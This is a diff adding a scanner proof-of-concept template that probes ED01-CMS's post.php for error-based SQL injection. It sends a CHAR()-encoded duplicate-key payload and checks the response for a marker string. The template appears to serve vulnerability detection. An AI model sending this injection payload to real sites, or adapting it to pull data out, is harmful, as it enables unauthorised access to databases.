@@ -1,0 +1,14 @@
+name: poc-yaml-ed01cms-sql
+rules:
+  - method: GET
+    path: >-
+      /post.php?pid=(select 1 and row(1,1)>(select count(*),concat(concat(CHAR(52),CHAR(67),CHAR(117),CHAR(54),CHAR(65),CHAR(76),CHAR(84),CHAR(115),CHAR(65),CHAR(119),CHAR(90)),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+    headers:
+      Cookie: key=value; PHPSESSID=chac4g7ulc1ss5uk9uu3mci464
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"4Cu6ALTsAwZ1")
+detail:
+  version: 2015
+  author: Lum
+  Links: https://github.com/chilin89117/ED01-CMS
